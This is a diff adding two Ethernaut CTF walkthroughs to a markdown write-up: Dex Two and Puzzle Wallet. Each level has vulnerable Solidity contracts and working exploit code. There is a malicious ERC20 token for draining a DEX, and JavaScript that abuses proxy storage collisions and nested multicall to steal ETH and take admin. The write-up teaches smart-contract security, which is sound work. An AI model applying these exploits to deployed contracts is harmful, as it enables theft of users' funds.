@@ -26,6 +26,8 @@ If you want to do the same, I recommend that you try to solve the levels on your
 21. [Level 20: Denial](#level-20-denial)
 22. [Level 21: Shop](#level-21-shop)
 23. [Level 22: Dex](#level-22-dex)
+24. [Level 22: Dex 2](#level-23-dex-2)
+25. [Level 24: Puzzle Wallet](#level-24-puzzle-wallet)
 
 
 
@@ -1827,7 +1829,7 @@ For the love of christ - do not trust any contract. The shop calls the
 There is nothing which prevents the `Buyer` contract to change its data
 between calls.
 
-## Dex <a name="dex"></a>
+## Level 22: Dex <a name="level-22-dex"></a>
 
 Let's have a look at the contract first:
 
@@ -2007,3 +2009,350 @@ Learning from the level itself:
 >
 >Chainlink Data Feeds are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer secure randomness, ability to make any API call, modular oracle network creation, upkeep, actions, and maintainance, and unlimited customization.
 
+## Level 23: Dex2 <a name="level-23-dex-2">
+
+Let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
+import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+import "openzeppelin-contracts-08/access/Ownable.sol";
+
+contract DexTwo is Ownable {
+    address public token1;
+    address public token2;
+
+    constructor() {}
+
+    function setTokens(address _token1, address _token2) public onlyOwner {
+        token1 = _token1;
+        token2 = _token2;
+    }
+
+    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
+        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+    }
+
+    function swap(address from, address to, uint256 amount) public {
+        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+        uint256 swapAmount = getSwapAmount(from, to, amount);
+        IERC20(from).transferFrom(msg.sender, address(this), amount);
+        IERC20(to).approve(address(this), swapAmount);
+        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+    }
+
+    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
+        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+    }
+
+    function approve(address spender, uint256 amount) public {
+        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
+        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
+    }
+
+    function balanceOf(address token, address account) public view returns (uint256) {
+        return IERC20(token).balanceOf(account);
+    }
+}
+
+contract SwappableTokenTwo is ERC20 {
+    address private _dex;
+
+    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
+        ERC20(name, symbol)
+    {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+}
+```
+
+in the previous Dex level, we had to reduce the token amount of the Dex contract
+of one token, either token1 or token2. In this level, we have to reduce the
+token amount of both tokens to 0.
+
+We can see that the Dex contracts `swap` function is a bit different - it doesn't
+check the addresses of the provided contracts. That means we can swap any token
+with any other token. Let's make use of that problem :)
+
+We write our own token contract, which is going to be used to drain the Dex:
+
+Our contract:
+
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+
+contract AttackerTokenr is ERC20 {
+
+    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
+        ERC20(name, symbol)
+    {
+        _mint(msg.sender, initialSupply);
+        _mint(dexInstance, initialSupply);
+    }
+}
+```
+
+Deploy the contract and set the address of the contract as the Dex instance address.
+
+You will have to approve the dex instance to spend your tokens. You can do that
+by calling the `approve` function of your deployed contract. I used Remix,
+so that makes it rather easy :)
+
+If we swap 100 from our freshly created tokens against token1, based on the
+calculation of the `getSwapAmount` function, we should get 100 tokens of token1
+in return. So let's do that :)
+
+```javascript
+await contract.swap("<your contract address>", await contract.token1(), 100)
+```
+
+Now we have those 100 tokens of the Dex :) 
+
+You have now 2 options to move forward: Either we continue to use our deployed
+contract to drain the Dex of token2 tokens, or we deploy it new and perform the
+same attack.
+
+I decided to reuse the same contract, and reminted the tokens, so thatI have the
+amout of tokens as the Dex has token2 tokens.
+
+Then we do it again:
+
+```javascript
+await contract.swap("<your contract address>", await contract.token2(), 100)
+```
+
+And you are done :)
+
+### Learning
+
+Taken from the level itself:
+
+>As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.
+>
+>Just because a contract claims to implement the ERC20 spec does not mean it's trust worthy.
+>
+>Some tokens deviate from the ERC20 spec by not returning a boolean value from their transfer methods. See Missing return value bug - At least 130 tokens affected.
+>
+>Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.
+>
+>If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.
+
+## Level 24: Puzzle Wallet <a name="level-24-puzzle-wallet"></a>
+
+Another day another level :) 
+
+Let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+pragma experimental ABIEncoderV2;
+
+import "../helpers/UpgradeableProxy-08.sol";
+
+contract PuzzleProxy is UpgradeableProxy {
+    address public pendingAdmin;
+    address public admin;
+
+    constructor(address _admin, address _implementation, bytes memory _initData)
+        UpgradeableProxy(_implementation, _initData)
+    {
+        admin = _admin;
+    }
+
+    modifier onlyAdmin() {
+        require(msg.sender == admin, "Caller is not the admin");
+        _;
+    }
+
+    function proposeNewAdmin(address _newAdmin) external {
+        pendingAdmin = _newAdmin;
+    }
+
+    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
+        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
+        admin = pendingAdmin;
+    }
+
+    function upgradeTo(address _newImplementation) external onlyAdmin {
+        _upgradeTo(_newImplementation);
+    }
+}
+
+contract PuzzleWallet {
+    address public owner;
+    uint256 public maxBalance;
+    mapping(address => bool) public whitelisted;
+    mapping(address => uint256) public balances;
+
+    function init(uint256 _maxBalance) public {
+        require(maxBalance == 0, "Already initialized");
+        maxBalance = _maxBalance;
+        owner = msg.sender;
+    }
+
+    modifier onlyWhitelisted() {
+        require(whitelisted[msg.sender], "Not whitelisted");
+        _;
+    }
+
+    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
+        require(address(this).balance == 0, "Contract balance is not 0");
+        maxBalance = _maxBalance;
+    }
+
+    function addToWhitelist(address addr) external {
+        require(msg.sender == owner, "Not the owner");
+        whitelisted[addr] = true;
+    }
+
+    function deposit() external payable onlyWhitelisted {
+        require(address(this).balance <= maxBalance, "Max balance reached");
+        balances[msg.sender] += msg.value;
+    }
+
+    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
+        require(balances[msg.sender] >= value, "Insufficient balance");
+        balances[msg.sender] -= value;
+        (bool success,) = to.call{value: value}(data);
+        require(success, "Execution failed");
+    }
+
+    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
+        bool depositCalled = false;
+        for (uint256 i = 0; i < data.length; i++) {
+            bytes memory _data = data[i];
+            bytes4 selector;
+            assembly {
+                selector := mload(add(_data, 32))
+            }
+            if (selector == this.deposit.selector) {
+                require(!depositCalled, "Deposit can only be called once");
+                // Protect against reusing msg.value
+                depositCalled = true;
+            }
+            (bool success,) = address(this).delegatecall(data[i]);
+            require(success, "Error while delegating call");
+        }
+    }
+}
+```
+
+Our objective is to become the owner of the PuzzleProxy contract.
+
+The PuzzleProxy contract is a proxy, which means that transactions are sent to
+the proxy contract, which forwards those to the implementation contract. The
+implementation contract is the PuzzleWallet contract.
+
+If you inspect the contract a bit deeper, you will see that the proxy contract
+uses delegatecall to forward the transactions to the implementation contract.
+Delegatecall means, that the implementation contract is being executed
+in the context of the proxy contract and the storage.
+
+Let's look at the storage variables of the 2 contract:
+Slot 0: `owner` in the PuzzleWallet contract
+Slot 0: `pendingAdmin` in the PuzzleProxy contract
+
+Slot 1: `maxBalance` in the PuzzleWallet contract
+Slot 1: `admin` in the PuzzleProxy contract
+
+Since the PuzzleWallet is executed in the context of the PuzzleProxy contract,
+once we write to `owner`, we also overwrite `pendingAdmin` in the PuzzleProxy contract.
+The same applies in the other direction - if we call the PuzzleProxy contract
+and write to `pendingAdmin`, we also overwrite `owner` in the PuzzleWallet contract.
+
+Let's see how we can become the owner of the PuzzleProxy contract:
+
+To become the admin of the PuzzleProxy contract, we have to set the `admin` variable
+in the contract. Since it overlaps with `maxBalance`, we need to set the `maxBalance`
+variable to our address.
+
+In order to set a new value for `maxBalance`, we have to call the `setMaxBalance`
+function of the PuzzleWallet contract. But we can't do that, since we are not
+whitelisted.
+
+In order to get whitelisted, we have to call the `addToWhitelist` function of the
+PuzzleWallet contract. But we can't do that, since we are not the owner.
+
+But we see, that the `owner` variable is overlapping with the `pendingAdmin` variable
+in the PuzzleProxy contract. We can set the `pendingAdmin` variable to our address
+by calling the `proposeNewAdmin` function of the PuzzleProxy contract, since it
+is external and does not have any restrictions.
+
+Once we set the `pendingAdmin` variable to our address, we can call the 
+`addToWhitelist` function, containing our address.
+
+We passed the first restriction of the `setMaxBalance` function. But there is
+a second restriction - the contract balance has to be 0.
+
+The initial balance of the PuzzleWallet is `0.001 Eth`.  The only function which
+reduces the balance of the contract is the `execute()` function. We would need to
+call the `execute()` function and somehow drain the contract of its balance.
+
+In order to call the `execute()` function and drain some value we need to have
+some balance in the first place. So we need to check if there is a way for us to
+deposit some balance in such a way that we are able to drain the contract.
+
+We can call the `deposit()` function of the PuzzleWallet contract, but if we send
+`0.001 Eth`, we will have a balance of `0.001 Eth`, but the contract has 
+a balance of `0.002 Eth`. We need to deposit somehow more than `0.001 Eth` without
+sending more than `0.001 Eth`.
+
+Let's try looking `multicall()` by calling `deposit()` twice. Looking at the code
+of the `multicall()` function, we can see that the `deposit()` function can only
+be called once, due to the `depositCalled` variable.
+
+`multicall()` allows to call multiple functions in one function call. What about
+if we call `deposit()` and `multicall()` within a `multicall()` call?
+That should work, since the `depositCalled` variable is a local variable and 
+we would be able to call the `deposit()` function again, within a new `multicall()`
+function call.
+
+I copied the PuzzleProxy contract to Remix and loaded the instance from the
+given instance address, to be able to call functions directly on the PuzzleProxy
+contract.
+
+Geez, sounds complicated. Let's try down the code which tailors everything together:
+
+
+```javascript
+// in remix
+await contract.proposeNewAdmin("0xYourAddress") // you might click also just the proposeNewAdmin button
+// in console
+await contract.addToWhitelist(player)
+const depositSignature = web3.eth.abi.encodeFunctionSignature("deposit()")
+const firstMultiCallSignature = web3.eth.abi.encodeFunctionSignature("multicall(bytes[])")
+const nestedMultiCallSig = web3.eth.abi.encodeFunctionCall({name: "multicall", type: "function", inputs: [{type: 'bytes[]', name: 'data'}]}, [[depositSignature]])
+const actualMultiCallSig = web3.eth.abi.encodeFunctionCall({name: "multicall", type: "function", inputs: [{type: 'bytes[]', name: 'data'}]}, [[nestedMultiCallSig, depositSignature]])
+await web3.eth.sendTransaction({from: player, to: contract.address, value: '1000000000000000',data: actualMultiCallSig.substring(2)})
+const balanceOne = await getBalance(contract.address)
+const balanceTwo = await contract.balances(player).then(v => v.toString())
+// Last two commands should show the same amount
+// if yes, we can continue
+await contract.execute(player, 2000000000000000, '0x')
+await contract.setMaxBalance(player)
+```
+
+And we are the owner :) Congratulations
+
+### Learning
+
+From the level:
+
+>Next time, those friends will request an audit before depositing any money on a contract. Congrats!
+>
+>Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.
+>
+>Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract.
